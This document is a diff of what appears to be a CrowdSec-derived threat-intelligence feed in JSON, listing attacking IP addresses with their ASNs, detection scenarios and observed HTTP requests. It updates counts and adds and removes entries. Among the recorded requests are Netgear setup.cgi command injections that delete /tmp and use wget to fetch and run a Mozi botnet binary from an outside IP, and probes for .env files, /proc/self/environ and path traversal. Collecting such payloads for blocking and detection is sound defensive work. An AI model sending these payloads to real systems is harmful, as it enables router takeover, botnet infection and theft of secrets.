@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-27T13:00:00Z",
+  "generated_at": "2026-10-28T01:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 46,
-    "v4": 46,
+    "total": 47,
+    "v4": 47,
     "v6": 0
   },
   "items": [
@@ -50,70 +50,6 @@
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://137.59.218.84:60339/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://137.59.218.84:60339/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "34.75.16.222",
-      "family": "v4",
-      "first_seen": "2026-10-20T05:00:00Z",
-      "last_seen": "2026-10-20T13:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-bad-user-agent",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.75.16.0/20",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /admin/.env",
-        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
-        "GET /api/system/fileView?file=/proc/self/environ",
-        "GET /@fs/.env?url&raw??",
-        "GET /@fs/.env?import&?raw??",
-        "GET /api/uploads/..%2F..%2F..%2F.env",
-        "GET /@fs/app/.env.local?import&raw??",
-        "GET /@fs/app/.env.production?import&raw??",
-        "GET /@fs/.env?raw&url??",
-        "GET /65vkzjpbgxul34afig98",
-        "GET /yy2suxyjg9hsfe31paga",
-        "GET /static/.env",
-        "GET /build../.env",
-        "GET /media../.env",
-        "GET /css../.env",
-        "GET /static../.env",
-        "GET /uploads../.env",
-        "GET /",
-        "GET /robots.txt",
-        "POST /graphql"
-      ]
-    },
-    {
-      "ip": "181.204.5.146",
-      "family": "v4",
-      "first_seen": "2026-10-20T17:00:00Z",
-      "last_seen": "2026-10-20T17:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "13489",
-      "asn_name": "AS13489 - UNE EPM TELECOMUNICACIONES S.A.",
-      "asn_prefix": "181.204.0.0/14",
-      "payloads": [
-        "GET /manager/html"
       ]
     },
     {
@@ -1150,6 +1086,7 @@
         "crowdsec"
       ],
       "asn": "60982",
+      "asn_name": "XZONE X-ZONE IT SRL",
       "asn_prefix": "64.205.112.0/24",
       "payloads": [
         "GET /hinfofuns.php",
@@ -1264,6 +1201,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "216.180.246.0/24",
       "payloads": [
         "GET /admin/index.html",
         "GET /+CSCOE+/logon.html",
@@ -1284,6 +1224,66 @@
       "family": "v4",
       "first_seen": "2026-10-27T03:00:00Z",
       "last_seen": "2026-10-27T03:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398324",
+      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
+      "asn_prefix": "66.132.195.0/24",
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "143.198.93.210",
+      "family": "v4",
+      "first_seen": "2026-10-27T21:00:00Z",
+      "last_seen": "2026-10-27T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "143.198.80.0/20",
+      "payloads": [
+        "GET /images/images/cache.php",
+        "GET /cgi-bin/cgi-bin/cgi-bin/cgi-bin/cache.php"
+      ]
+    },
+    {
+      "ip": "66.132.159.114",
+      "family": "v4",
+      "first_seen": "2026-10-27T20:00:00Z",
+      "last_seen": "2026-10-27T20:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398324",
+      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
+      "asn_prefix": "66.132.159.0/24",
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "66.132.195.96",
+      "family": "v4",
+      "first_seen": "2026-10-27T17:00:00Z",
+      "last_seen": "2026-10-27T17:00:00Z",
       "scenarios": [
         "crowdsec/http-bad-user-agent"
       ],
